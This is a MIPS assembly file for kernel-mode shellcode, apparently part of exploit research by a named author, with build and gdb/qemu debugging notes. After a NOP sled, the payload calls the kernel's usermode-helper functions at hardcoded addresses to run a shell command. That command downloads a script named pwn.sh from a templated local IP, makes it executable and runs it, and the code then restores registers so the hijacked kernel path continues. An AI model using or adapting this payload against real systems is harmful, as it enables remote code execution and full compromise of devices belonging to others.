# Axel '0vercl0k' Souchet - September 24 2021
# $ mips-linux-gnu-as -march=mips32r2 sh.asm -o sh.o && mips-linux-gnu-ld --omagic --section-start=.text=0x85000010 sh.o -o sh
# $ readelf -x .text sh > payload.txt
#
# To debug in umode:
# $ gdb-multiarch -q sh -ex 'target remote localhost:1234'
# $ qemu-mips -g 1234 ./sh
#
# To debug in kmode:
# 1: x/10i $pc
# => 0x801418e0 <__wake_up_common+80>:    jalr    v1
# gdb> break *0x801418e0
# gdb> set $v1=sh
#
# ____call_usermodehelper
.text
.global __start;

__start:

# NOP sled
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero
add $zero, $zero, $zero

# Save overwritten registers ($s registers are expected to be saved by
# callees): $ra, $s0, $s1
addi $sp, $sp, -12
sw $ra, 0($sp)
sw $s0, 4($sp)
sw $s1, 8($sp)

# Only run the payload once
la $a0, executed_already
lw $a1, ($a0)
bne $a1, $zero, done
li $a1, 1
sw $a1, ($a0)

# call_usermodehelper_setup(
#  argv[0],
#  argv,
#  envp,
#  GPF_ATOMIC
# )
la $a0, arg0
la $a1, argv
la $a2, envp
li $a3, 32

la $s1, call_usermodehelper_setup
lw $s1, ($s1)
jalr $s1

# call_usermodehelper_exec(
#   info,
#   UMH_NO_WAIT=-1
# )
move $a0, $v0
li $a1, 1
la $s1, call_usermodehelper_exec
lw $s1, ($s1)
jalr $s1

# Restore registers
done:
lw $ra, 0($sp)
lw $s0, 4($sp)
lw $s1, 8($sp)

# Carry on w/ business
li $v0, 1
# $s5 is flags in caller: (flags & WQ_FLAG_EXCLUSIVE)
li $s5, 1
# $s0 is 
li $s0, 1
addi $sp, $sp, 12
jr $ra

executed_already: .word 0
# 800853cc T call_usermodehelper_setup
call_usermodehelper_setup: .word 0x800853cc
# 80085818 T call_usermodehelper_exec
call_usermodehelper_exec: .word 0x80085818

arg0: .asciiz "/bin/sh"
arg1: .asciiz "-c"
arg2: .asciiz "wget http://{ip_local}:8000/pwn.sh && chmod +x pwn.sh && ./pwn.sh"
argv: .word arg0
      .word arg1
      .word arg2
envp: .word 0
